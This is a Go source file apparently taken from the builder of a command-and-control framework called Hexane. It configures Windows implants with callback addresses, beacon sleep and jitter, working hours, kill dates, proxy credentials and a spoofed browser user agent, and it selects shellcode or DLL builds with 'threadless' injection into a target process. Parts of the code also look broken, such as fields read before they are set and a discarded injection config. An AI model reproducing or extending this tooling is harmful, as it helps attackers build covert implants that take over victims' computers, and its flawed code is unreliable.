package core

import (
	"fmt"
	"os"
	"strings"
)

var (
	Debug        = false
	ShowCommands = false

	Cb             = make(chan Callback)
	HexanePayloads = new(Payloads)
	HexaneServers  = new(ServerList)
	HexaneSession  = &Session{
		Username: "lemur",
		Admin:    true,
	}

	FSTAT_RW  = os.O_RDWR | os.O_APPEND
	Useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"
)

var ModuleStrings = []string{
	"crypt32",
	"winhttp",
	"advapi32",
	"iphlpapi",
}

func (h *HexaneConfig) GetTransportType() (string, error) {

	switch h.Implant.ProfileTypeId {
	case TRANSPORT_HTTP:
		return "TRANSPORT_HTTP", nil
	case TRANSPORT_PIPE:
		return "TRANSPORT_PIPE", nil
	default:
		return "", fmt.Errorf("transport type was not defined")
	}
}

func (h *HexaneConfig) GetEmbededStrings(strList []string) []byte {

	stream := new(Stream)
	stream.PackString(string(h.Key))

	switch h.Implant.ProfileTypeId {
	case TRANSPORT_HTTP:
		stream.PackDword(1)
	case TRANSPORT_PIPE:
		stream.PackDword(0)
	default:
		return nil
	}

	stream.PackDword(1) // Ctx->LE == TRUE

	for _, str := range strList {
		stream.PackString(str)
	}

	return stream.Buffer
}

func (h *HexaneConfig) GenerateConfigBytes() error {
	var (
		err   error
		patch []byte
	)

	key := CryptCreateKey(16)
	if patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	h.Key = key
	h.ConfigBytes = patch // Assuming XteaCrypt(patch) if needed.

	return nil
}

func (h *HexaneConfig) CreateConfig(jsonCfg *JsonConfig) {

	WrapMessage("INF", "generating config for "+h.Compiler.FileExtension)

	h.Compiler = new(Compiler)
	h.Implant = new(Implant)

	h.Implant.ImplantName = jsonCfg.Builder.OutputName
	h.Compiler.BuildDirectory = fmt.Sprintf("../payload/%s", strings.TrimSuffix(h.Implant.ImplantName, h.Compiler.FileExtension))

	h.Compiler.Debug = jsonCfg.Config.Debug
	h.Compiler.Arch = jsonCfg.Config.Arch
	h.Compiler.Mingw = "/usr/bin/x86_64-w64-mingw32-g++"
	h.Compiler.Linker = "/usr/bin/x86_64-w64-mingw32-ld"
	h.Compiler.Objcopy = "/usr/bin/x86_64-w64-mingw32-objcopy"
	h.Compiler.Windres = "/usr/bin/x86_64-w64-mingw32-windres"
	h.Compiler.Strip = "/usr/bin/x86_64-w64-mingw32-strip"
	h.Compiler.Assembler = "/usr/bin/nasm"

	h.Implant.LoadedModules = []string{
		"crypt32",
		"winhttp",
		"advapi32",
		"iphlpapi",
		".reloc",
	}

	if jsonCfg.Config.Debug {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-g -Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,-s,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	} else {
		h.Compiler.Flags = []string{
			"",
			"-std=c++23",
			"-Os -nostdlib -fno-asynchronous-unwind-tables -masm=intel",
			"-fno-ident -fpack-struct=8 -falign-functions=1",
			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
			"-falign-labels=1 -fPIC",
			"-Wl,--no-seh,--enable-stdcall-fixup,--gc-sections",
		}
	}
}

func ReadConfig(cfgPath string) error {
	var (
		err error
		j   *JsonConfig
		h   *HexaneConfig
	)

	h = new(HexaneConfig)
	WrapMessage("INF", fmt.Sprintf("loading %s", cfgPath))

	if j = ReadJson(cfgPath); j == nil {
		return fmt.Errorf("%s not found", cfgPath)
	}

	h.CreateConfig(j)
	h.PeerId = GeneratePeerId()
	h.Implant.Sleeptime = uint32(j.Config.Sleeptime)
	h.Implant.Jitter = uint32(j.Config.Jitter)

	if h.Implant.WorkingHours, err = ParseWorkingHours(j.Config.WorkingHours); err != nil {
		return err
	}
	if h.Implant.Hostname = j.Config.Hostname; h.Implant.Hostname == "" {
		return fmt.Errorf("config:: - a hostname must be provided")
	}

	h.Network = new(Network)
	switch j.Network.ProfileType {
	case "http":
		// Handle, SigTerm, Success and Next are added later
		h.Network.Config = new(Http)

		hNet := h.Network.Config.(*Http)
		jNet := j.Network.Config.(*Http)

		hNet.Domain = jNet.Domain
		if hNet.Address = jNet.Address; hNet.Address == "" {
			return fmt.Errorf("network::http - ip address must be specified")
		}
		if hNet.Port = jNet.Port; hNet.Port > 65535 || hNet.Port < 1 {
			return fmt.Errorf("network::http - invalid tcp port %d", hNet.Port)
		}
		if jNet.Endpoints != nil {
			hNet.Endpoints = append(hNet.Endpoints, jNet.Endpoints...)
		} else {
			return fmt.Errorf("network::http - at least 1 http endpoint must be specified")
		}

		if hNet.Useragent = jNet.Useragent; hNet.Useragent == "" {
			hNet.Useragent = Useragent
		}
		if jNet.Headers != nil {
			hNet.Headers = append(hNet.Headers, jNet.Headers...)
		}

		if jNet.Proxy != nil {
			hNet.Proxy = new(Proxy)

			hNet.Proxy.Address = jNet.Proxy.Address
			hNet.Proxy.Username = jNet.Proxy.Username
			hNet.Proxy.Password = jNet.Proxy.Password
			hNet.Proxy.Port = jNet.Proxy.Port
		}

	case "smb":
		// IngressPeer and all pipe names are added later
		h.Network.Config = new(Smb)

		netConfig := h.Network.Config.(*Smb)
		jNet := j.Network.Config.(*Smb)

		if jNet.EgressPeer != "" {
			netConfig.EgressPeer = jNet.EgressPeer
		} else {
			return fmt.Errorf("network::smb - peer must have it's parent node name specified")
		}

	default:
		return fmt.Errorf("network:: - unknown network profile type")
	}

	h.Implant = new(Implant)
	h.Compiler = new(Compiler)

	implant := h.Implant
	compiler := h.Compiler

	if j.Builder != nil {

		implant.ImplantName = j.Builder.OutputName
		compiler.RootDirectory = j.Builder.RootDirectory
		compiler.LinkerScript = j.Builder.LinkerScript

		if j.Builder.Objects.Sources != nil {
			compiler.Sources = append(compiler.Sources, j.Builder.Objects.Sources...)
		} else {
			return fmt.Errorf("implant::builder - builder must specify source files")
		}

		if j.Builder.Loader == nil {
			h.BuildType = BUILD_TYPE_SHELLCODE

		} else {
			h.BuildType = BUILD_TYPE_DLL

			implant.Loader = new(Loader)
			implant.Loader.InjectionType = j.Builder.Loader.InjectionType
			implant.Loader.LinkerScript = j.Builder.Loader.LinkerScript
			implant.Loader.MainFile = j.Builder.Loader.MainFile
			implant.Loader.RsrcScript = j.Builder.Loader.RsrcScript

			switch implant.Loader.InjectionType {
			case "threadless":
				threadless := implant.Loader.Config.(*Threadless)
				jConfig := j.Builder.Loader.Config.(*Threadless)

				threadless = new(Threadless)
				threadless.TargetProc = jConfig.TargetProc
				threadless.TargetModule = jConfig.TargetModule
				threadless.TargetFunc = jConfig.TargetFunc
				threadless.LoaderAsm = jConfig.LoaderAsm
				threadless.Execute = jConfig.Execute

			default:
				return fmt.Errorf("implant::loader - unknown injection method")
			}
		}
	} else {
		return fmt.Errorf("implant::builder - a build definition needs to be provided")
	}

	h.UserSession = HexaneSession
	return h.RunBuild()
}

func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
	var err error

	stream := CreateStream()
	implant := h.Implant

	stream.PackDword(h.PeerId)
	stream.PackString(implant.Hostname)
	stream.PackDword(implant.Sleeptime)
	stream.PackDword(implant.Jitter)
	stream.PackDword64(implant.Killdate)
	stream.PackInt32(implant.WorkingHours)

	switch implant.ProfileTypeId {
	case TRANSPORT_HTTP:
		{
			hNet := h.Network.Config.(*Http)

			stream.PackWString(hNet.Useragent)
			stream.PackWString(hNet.Address)
			stream.PackString(hNet.Domain)
			stream.PackDword(uint32(hNet.Port))

			// endpoints always need specified
			// todo: add random endpoints when not specified. use seclists or smth.
			stream.PackDword(uint32(len(hNet.Endpoints)))
			for _, uri := range hNet.Endpoints {
				stream.PackWString(uri)
			}

			if hNet.Proxy != nil {
				proxyUrl := fmt.Sprintf("%v://%v:%v", h.Proxy.Proto, h.Proxy.Address, h.Proxy.Port)

				stream.PackDword(1)
				stream.PackWString(proxyUrl)
				stream.PackWString(h.Proxy.Username)
				stream.PackWString(h.Proxy.Password)

			} else {
				stream.PackDword(0)
			}

			break
		}
	case TRANSPORT_PIPE:
		{
			hNet := h.Network.Config.(*Smb)
			stream.PackWString(hNet.EgressPipename)
		}
	}
	return stream.Buffer, err
}
